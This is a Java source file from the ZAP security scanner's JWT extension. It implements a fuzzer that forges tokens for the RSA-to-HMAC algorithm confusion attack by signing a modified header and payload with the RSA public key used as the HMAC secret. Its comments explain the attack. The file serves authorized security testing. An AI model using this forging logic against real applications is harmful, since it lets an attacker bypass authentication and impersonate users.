/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2019 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.jwt.fuzzer;

import static org.zaproxy.zap.extension.jwt.JWTUtils.HMAC_256;
import static org.zaproxy.zap.extension.jwt.JWTUtils.HS256_ALGO_JAVA;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_ALGORITHM_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_HEADER_WITH_ALGO_PLACEHOLDER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_RSA_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_TOKEN_PERIOD_CHARACTER;

import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SignatureException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.List;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.collections.CollectionUtils;
import org.json.JSONException;
import org.json.JSONObject;
import org.zaproxy.zap.extension.jwt.JWTTokenBean;
import org.zaproxy.zap.extension.jwt.JWTUtils;

/** @author preetkaran20@gmail.com KSASAN */
public class SignatureFuzzer implements JWTFuzzer {

    /**
     * Returns Fuzzed tokens by confusing algo keys.
     *
     * <p>Background about the attack:<br>
     * Say an application is using RSA to sign JWT now what will be the verification method {@code
     * verify(String jwtToken, byte[] key); }
     *
     * <p>Now if application is using RSA then for verification RSA public key will be used and in
     * case jwttoken is based on HMAC algorithm then verify method will think key as Secret key for
     * HMAC and will try to decrypt it and as public key is known to everyone so anyone can sign the
     * key with public key and HMAC will accept it.
     *
     * @param jwtTokenBean
     * @return
     * @throws JSONException
     * @throws IOException
     * @throws InvalidKeySpecException
     * @throws NoSuchAlgorithmException
     * @throws InvalidKeyException
     * @throws SignatureException
     */
    private List<String> getAlgoKeyConfusionFuzzedToken(JWTTokenBean jwtTokenBean)
            throws JSONException, NoSuchAlgorithmException, InvalidKeySpecException, IOException,
                    InvalidKeyException, SignatureException {
        List<String> fuzzedTokens = new ArrayList<>();
        JSONObject jwtHeaderJSON = new JSONObject(jwtTokenBean.getHeader());
        String algoType = jwtHeaderJSON.getString(JWT_ALGORITHM_KEY_HEADER);
        if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)) {
            String jwtFuzzedHeader = String.format(JWT_HEADER_WITH_ALGO_PLACEHOLDER, HMAC_256);
            String base64EncodedFuzzedHeaderAndPayload =
                    JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(jwtFuzzedHeader)
                            + JWT_TOKEN_PERIOD_CHARACTER
                            + JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(
                                    jwtTokenBean.getPayload());
            byte[] base64EncodedFuzzedHeaderAndPayloadBytes =
                    JWTUtils.getBytes(base64EncodedFuzzedHeaderAndPayload);
            Mac sha256_HMAC = Mac.getInstance(HS256_ALGO_JAVA);
            SecretKeySpec secret_key =
                    new SecretKeySpec(JWTUtils.getRSAPublicKey().getEncoded(), HS256_ALGO_JAVA);
            sha256_HMAC.init(secret_key);
            byte[] signature = sha256_HMAC.doFinal(base64EncodedFuzzedHeaderAndPayloadBytes);
            String base64EncodedSign =
                    JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(signature);
            fuzzedTokens.add(
                    base64EncodedFuzzedHeaderAndPayload
                            + JWT_TOKEN_PERIOD_CHARACTER
                            + base64EncodedSign);
        }
        return fuzzedTokens;
    }

    @Override
    public List<String> fuzzedTokens(JWTTokenBean jwtTokenBean) {
        List<String> fuzzedTokens = new ArrayList<>();
        List<String> algoKeyConfusionFuzzedTokens;
        try {
            algoKeyConfusionFuzzedTokens = getAlgoKeyConfusionFuzzedToken(jwtTokenBean);
            if (CollectionUtils.isNotEmpty(algoKeyConfusionFuzzedTokens)) {
                fuzzedTokens.addAll(algoKeyConfusionFuzzedTokens);
            }
        } catch (InvalidKeyException
                | NoSuchAlgorithmException
                | InvalidKeySpecException
                | SignatureException
                | JSONException
                | IOException e) {
            // TODO Need to Handle Exception
            e.printStackTrace();
        }
        return fuzzedTokens;
    }
}
